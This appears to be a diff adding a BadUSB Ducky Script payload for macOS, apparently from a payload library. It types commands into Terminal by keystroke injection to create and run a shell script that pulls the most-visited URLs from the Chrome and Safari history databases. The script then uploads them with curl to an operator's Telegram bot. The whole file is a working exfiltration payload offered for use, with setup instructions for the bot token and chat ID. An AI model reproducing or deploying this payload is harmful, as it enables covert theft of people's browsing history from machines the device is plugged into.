@@ -1,0 +1,47 @@
+REM Title: macOS Browser History to Telegram
+REM Author: BadUSB Library
+REM Description: Extracts browser history and sends to Telegram
+REM Target: macOS 10.15+
+REM Category: Collection
+REM Type: Configuration Needed
+
+REM *SETUP*
+REM Replace TELEGRAM_BOT_TOKEN with your Telegram Bot Token
+REM Replace TELEGRAM_CHAT_ID with your Telegram Chat ID
+
+REM Open Terminal
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Terminal
+ENTER
+DELAY 3000
+
+REM Extract browser history
+STRING cat > /tmp/browser_history.sh << 'EOF'
+#!/bin/bash
+BOT_TOKEN="TELEGRAM_BOT_TOKEN"
+CHAT_ID="TELEGRAM_CHAT_ID"
+
+# Chrome history
+if [ -f ~/Library/Application\ Support/Google/Chrome/Default/History ]; then
+    sqlite3 ~/Library/Application\ Support/Google/Chrome/Default/History "SELECT url FROM urls ORDER BY visit_count DESC LIMIT 20;" > /tmp/chrome_history.txt
+    curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" -F chat_id="${CHAT_ID}" -F document=@/tmp/chrome_history.txt -F caption="Chrome History"
+fi
+
+# Safari history
+if [ -f ~/Library/Safari/History.db ]; then
+    sqlite3 ~/Library/Safari/History.db "SELECT url FROM history_items ORDER BY visit_count DESC LIMIT 20;" > /tmp/safari_history.txt
+    curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" -F chat_id="${CHAT_ID}" -F document=@/tmp/safari_history.txt -F caption="Safari History"
+fi
+EOF
+ENTER
+DELAY 2000
+
+STRING chmod +x /tmp/browser_history.sh
+ENTER
+DELAY 1000
+
+STRING /tmp/browser_history.sh
+ENTER
+DELAY 2000
